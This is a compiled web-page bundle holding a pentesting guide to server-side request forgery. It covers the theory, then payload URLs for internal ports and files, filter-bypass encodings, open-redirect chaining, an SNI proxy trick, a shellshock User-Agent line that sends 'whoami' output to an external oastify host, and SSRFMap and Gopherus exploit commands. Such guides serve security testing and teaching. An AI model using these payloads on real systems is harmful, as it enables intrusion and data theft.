import{_ as h,c as p,a5 as l,G as t,w as a,B as r,o as c,j as e,a as s}from"./chunks/framework.B5CpDqM0.js";const d="/assets/SSRF.BLQ0lt-W.png",v=JSON.parse('{"title":"SSRF (Server-Side Request Forgery)","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/ssrf/index.md","filePath":"web/inputs/ssrf/index.md","lastUpdated":1724982529000}'),k={name:"web/inputs/ssrf/index.md"};function u(g,i,b,f,y,m){const n=r("PluginTabsTab"),o=r("PluginTabs");return c(),p("div",null,[i[2]||(i[2]=l(`<h1 id="ssrf-server-side-request-forgery" tabindex="-1">SSRF (Server-Side Request Forgery) <a class="header-anchor" href="#ssrf-server-side-request-forgery" aria-label="Permalink to &quot;SSRF (Server-Side Request Forgery)&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>A Server-Side Request Forgery (a.k.a. SSRF) is a web vulnerability allowing attackers to make the server-side application do certain requests. This vulnerability can lead to unauthorized actions, Sensitive Information Disclosure and even RCE (Remote Code Execution).</p><div class="tip custom-block"><p>SSRF is to <a href="./../file-inclusion/index">file inclusion</a> since both vulnerabilities can be exploited to access external or internal content. The difference resides in the fact that file inclusion vulnerabilities rely on code inclusion functions (e.g. <code>include()</code> in PHP) while SSRF ones on functions that only handle data (e.g. <code>file_get_contents()</code>, <code>fopen()</code>, <code>fread()</code>, <code>fsockopen()</code>, <code>curl_exec()</code> in PHP), meaning file inclusion vulnerabilities will usually lead to RCE much more easily that SSRF ones.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Testers need to find input vectors and fields that could be used for publishing or importing data from a URL (e.g. <code>GET</code> and <code>POST</code> parameters).</p><p>With <code>http://some.website/index.php?url=https://someother.website/index.php</code>, and <code>url</code> being the vulnerable parameter, the following basic payloads can help a tester fetch content of files, scan ports, access filtered resources and so on.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>file://PATH/TO/FILE</span></span>
<span class="line"><span>http://127.0.0.1:80/admin</span></span>
<span class="line"><span>http://127.0.0.1:80</span></span>
<span class="line"><span>http://127.0.0.1:22</span></span>
<span class="line"><span>ldap://127.0.0.1:389/%0astats%0aquit</span></span>
<span class="line"><span>dict://{attacker_url}:11111/</span></span>
<span class="line"><span>sftp://{attacker_url}:11111/</span></span>
<span class="line"><span>tftp://{attacker_url}:12346/TESTUDPPACKET</span></span></code></pre></div><p>To scan for a specific range of private IP addresses (other than <code>localhost</code>), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted.</p><h3 id="bypassing-filters" tabindex="-1">Bypassing filters <a class="header-anchor" href="#bypassing-filters" aria-label="Permalink to &quot;Bypassing filters&quot;">​</a></h3><p>In order to conduct SSRF attacks properly, there may be use cases where filters need to be bypassed</p>`,11)),t(o,null,{default:a(()=>[t(n,{label:"Blacklist input filters"},{default:a(()=>i[0]||(i[0]=[e("p",null,[s("Some applications block input containing hostnames like "),e("code",null,"127.0.0.1"),s(" and "),e("code",null,"localhost"),s(", or sensitive URLs like "),e("code",null,"/admin"),s(". In this situation, you can bypass the filter using various techniques :")],-1),e("ul",null,[e("li",null,"Using an alternative IP representation such as :")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"http://127.1")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://0")]),s(`
`),e("span",{class:"line"},[e("span",null,"http:@0/")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://0.0.0.0:80")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://[::]:80/")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://[0000::1]:80/")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://2130706433 # Decimal version of localhost")]),s(`
`),e("span",{class:"line"},[e("span",null,"http://0x7f000001/ # Hexadecimal version of localhost")])])])],-1),e("ul",null,[e("li",null,"Obfuscating string using URL encoded, even double URL encoded sometimes."),e("li",null,[s("Registered your own domain name that resolved the "),e("code",null,"localhost"),s(" IP address.")])],-1),e("div",{class:"tip custom-block"},[e("p",null,[s('The following "URL Format Bypass" cheatsheet gives lots of examples to bypass filters: '),e("a",{href:"https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md",target:"_blank",rel:"noreferrer"},"https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md")])],-1)])),_:1}),t(n,{label:"Whitelist input filters"},{default:a(()=>i[1]||(i[1]=[e("h3",{id:"pattern-validation",tabindex:"-1"},[s("Pattern validation "),e("a",{class:"header-anchor",href:"#pattern-validation","aria-label":'Permalink to "Pattern validation"'},"​")],-1),e("p",null,"In this context, a whitelist-based input filter can be used to restrict the types of URLs that a user can submit. For example, the filter might only allow URLs that match the whitelist pattern. In this situation, you can bypass the filter using various techniques :",-1),e("ul",null,[e("li",null,[s("Using the "),e("code",null,"@"),s(" character in a URL like this :")]),e("li",null,[e("code",null,"https://{url}@{target_host}")]),e("li",null,[s("Using the "),e("code",null,"#"),s(" character to indicate that the first field is interpreted as a URL fragment like this :")]),e("li",null,[e("code",null,"https://{target_host}#{url}")]),e("li",null,"Using the DNS name to place required input into a fully-qualified DNS like this :"),e("li",null,[e("code",null,"https://{url}.{target_host}")]),e("li",null,"URL encode, even double URL encoding this special character to bypass the filter"),e("li",null,[s("Use a combination of all this technique like using the "),e("code",null,"#@"),s(" characters.")])],-1),e("h3",{id:"ored-open-redirect-combination",tabindex:"-1"},[e("a",{href:"#ored-open-redirect-combination"},"ORED (Open Redirect)"),s(" combination "),e("a",{class:"header-anchor",href:"#ored-open-redirect-combination","aria-label":'Permalink to "[ORED (Open Redirect)](#ored-open-redirect-combination) combination"'},"​")],-1),e("p",null,[s("In the case the argument is strictly validated and doesn't allow for bypasses relying on pattern validation, if one of the whitelisted app's pages is vulnerable to an "),e("a",{href:"#ored-open-redirect-combination"},"ORED (Open Direct)"),s(", it could be used to make the SSRF possible anyway.")],-1),e("p",null,"The server would request the ORED-vulnerable page through the SSRF vulnerability, and it would then be redirected to the actual target page, thanks to the lesser-filtered Open Redirect.",-1),e("p",null,[e("img",{src:d,alt:""})],-1)])),_:1})]),_:1}),i[3]||(i[3]=l(`<h3 id="blind-ssrf-vulnerabilities" tabindex="-1">Blind SSRF vulnerabilities <a class="header-anchor" href="#blind-ssrf-vulnerabilities" aria-label="Permalink to &quot;Blind SSRF vulnerabilities&quot;">​</a></h3><p>A blind SSRF vulnerability is a type of vulnerability that arises when an application makes a request to an external resource using user-supplied input, but the application does not return the response to the user.</p><p>It can be achieved to gain full RCE (Remote Command Execution).</p><p>In order to identify a potential SSRF vulnerability and exploit, multiple tools can be used to pingback the request and see the response.</p><ul><li><a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noreferrer">Burp Suite Collaborator</a></li><li><a href="http://pingb.in/" target="_blank" rel="noreferrer">pingb</a></li><li><a href="https://canarytokens.org/generate" target="_blank" rel="noreferrer">canarytokens</a></li><li><a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noreferrer">interactsh</a></li><li><a href="http://webhook.site/" target="_blank" rel="noreferrer">webhook</a></li><li><a href="https://github.com/teknogeek/ssrf-sheriff" target="_blank" rel="noreferrer">ssrf-sheriff</a></li><li>An extension to add to Burp Suite, called &quot;<a href="https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968" target="_blank" rel="noreferrer">collaborator everywhere</a>&quot;, that adds non-invasive payloads into outgoing HTTP requests&#39; headers in order to detect SSRF vulnerabilities if and when the target pingbacks to the collaborator endpoint.</li></ul><div class="tip custom-block"><p>An effective way to abuse blind SSRF is to combine it with a shellshock vulnerability (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271" target="_blank" rel="noreferrer">CVE-2014-6271</a>). See the following resource for more details: <a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation" target="_blank" rel="noreferrer">PortSwigger Lab: Blind SSRF with shellshock</a>. The &quot;<a href="https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968" target="_blank" rel="noreferrer">collaborator everywhere</a>&quot; extension can be used to detect and abuse this as well.</p></div><h3 id="ssrf-via-sni-data-from-certificate" tabindex="-1">SSRF via SNI data from certificate <a class="header-anchor" href="#ssrf-via-sni-data-from-certificate" aria-label="Permalink to &quot;SSRF via SNI data from certificate&quot;">​</a></h3><p>The configuration below is insecure and allows to connect to an arbitrary backend, since the SNI field value is used directly as the address of the backend.</p><div class="language-json vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">json</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">stream {</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">    server</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> {</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">        listen</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> 443;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">        resolver</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> 127.0.0.11;</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">        proxy_pass</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> $ssl_preread_server_name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">443</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">       </span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">        ssl_preread</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> on;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre></div><p>With this insecure configuration, it is possible to exploit the SSRF vulnerability simply by specifying the desired IP or domain name in the SNI field. For example, the following command would force the server to connect to <code>internal.host.com</code>:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> s_client</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -connecttarget.com:443</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -servername</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;internal.host.com&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -crlfbash</span></span></code></pre></div><blockquote><p>More information about this on <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-via-sni-data-from-certificate" target="_blank" rel="noreferrer">Hacktricks</a>.</p></blockquote><h3 id="ssrf-with-command-injection" tabindex="-1">SSRF with Command Injection <a class="header-anchor" href="#ssrf-with-command-injection" aria-label="Permalink to &quot;SSRF with Command Injection&quot;">​</a></h3><p>It is possible to use SSRF that return the command output inside an out of band connection as follows.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>url=http://zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com?\`whoami\`</span></span>
<span class="line"><span>User-Agent: () { :; }; /bin/nslookup $(whoami).zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com</span></span></code></pre></div><p><a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noreferrer">SSRFMap</a> (Python) is a tool used to ease the exploitation of SSRFs. <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noreferrer">Gopherus</a> (Python) can be used as well to gain RCE (Remote Code Execution) by generating Gopher payloads.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># using SSRFMap</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ssrfmap.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> data/request.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> readfiles</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># using Gopherus</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">gopherus</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mysql</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # It only asks username of the MySQL user</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> postgresql</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # It only asks username of the Postgres user and database name</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fastcgi</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # It only asks for a file which must be present in the victim system(preferable .php file)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> redis</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # Get a reverse or php shell to overwrite the file in the system</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> zabbix</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # If port 10050 is open and EnableRemoteCommands = 1, then it is possible to run shell command</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> pymemcache</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # Python deserialization issue that lead to RCE</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rbmemcache</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # Ruby deserialization issue that lead to RCE</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> phpmemcache</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # PHP deserialization issue that lead to RCE</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dmpmemcache</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # Dump memory cache content</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">	 --exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smtp</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # If port 25 is open and we can access it then, we can send message to anyone as victim user by generating email payload</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noreferrer">https://portswigger.net/web-security/ssrf</a></p><p><a href="https://portswigger.net/web-security/ssrf/blind" target="_blank" rel="noreferrer">https://portswigger.net/web-security/ssrf/blind</a></p><p><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank" rel="noreferrer">https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" rel="noreferrer">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</a></p>`,23))])}const S=h(k,[["render",u]]);export{v as __pageData,S as default};
